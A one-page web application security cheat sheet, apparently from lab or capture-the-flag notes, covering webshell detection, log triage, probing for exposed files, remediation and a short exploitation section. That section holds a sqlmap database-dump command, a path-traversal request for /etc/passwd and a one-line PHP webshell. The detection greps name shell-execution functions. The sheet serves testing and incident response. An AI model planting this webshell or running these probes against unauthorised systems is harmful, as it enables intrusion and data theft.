# Web App Cheat Sheet (print this one page)

## Webshell detection
```bash
find /var/www -type f \( -name "*.php" -o -name "*.jsp" -o -name "*.asp*" \) -mtime -3
grep -rliE "eval\s*\(|base64_decode\s*\(|system\s*\(|shell_exec\s*\(|passthru\s*\(" /var/www --include="*.php"
```

## Access log triage
```bash
awk '{print $7}' access.log | sort | uniq -c | sort -rn | head -30     # top requested URLs
awk '{print $1}' access.log | sort | uniq -c | sort -rn | head -20     # top client IPs
grep -Ei "union(.*)select|<script>|\.\./\.\./|/etc/passwd|cmd=|eval\(" access.log
```

## Common weaknesses to check
```bash
curl -s http://target/.git/config          # exposed .git
curl -s http://target/wp-config.php        # exposed config
curl -sI http://target/                    # version fingerprint via headers
gobuster dir -u http://target/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,bak
```

## Exploitation (if offensive-side task)
```bash
sqlmap -u "http://target/page.php?id=1" --batch --dbs
curl "http://target/index.php?page=../../../../etc/passwd"   # LFI test
```
Minimal PHP shell (authorized testing only): `<?php system($_GET['cmd']); ?>`

## Remediation
- Remove webshell (copy aside as evidence first).
- Patch the actual entry point (upload validation, exposed config, outdated plugin).
- Disable directory listing; remove `.git`/`.env`/backup files from webroot.
- Confirm the app still loads + the patched feature still works for legit use.

**Full detail:** `web/01..04-*.md` | **Rules reminder:** `00-rules-and-reminders.md`
